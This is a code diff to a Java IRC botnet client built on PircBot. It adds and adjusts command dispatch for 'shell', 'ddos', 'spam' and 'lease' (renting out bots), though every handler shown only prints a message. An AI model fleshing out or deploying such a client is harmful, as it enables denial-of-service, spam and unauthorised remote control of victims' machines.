@@ -5,6 +5,9 @@ import java.util.*;
 import org.jibble.pircbot.*;
 
 public class BotnetClient extends PircBot {
+	private static final String[] COMMANDS = {"shell", "ddos", "spam", "lease"};
+	private static final String[] LEASE_COMMANDS = {"ddos", "spam"};
+	
 	private static final String SENTINEL = "$: ";
 	private static final String TERMINATION = "exit";
 	private static final boolean DEBUG = true;
@@ -43,12 +46,10 @@ public class BotnetClient extends PircBot {
 		
 	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
 		message = message.toLowerCase();
-		if (message.startsWith("shell")) {
-			System.out.println("Exposing Shell");
-		} else if (message.startsWith("spam")) {
+		if (message.startsWith("spam")) {
 			System.out.println("Sending Spam");
 		} else if (message.startsWith("ddos")) {
-			System.out.println("DDOSing");
+			System.out.println(sender + ": " + message);
 		} else if (message.startsWith("lease")) {
 			System.out.println("Leasing Myself");
 		} else {
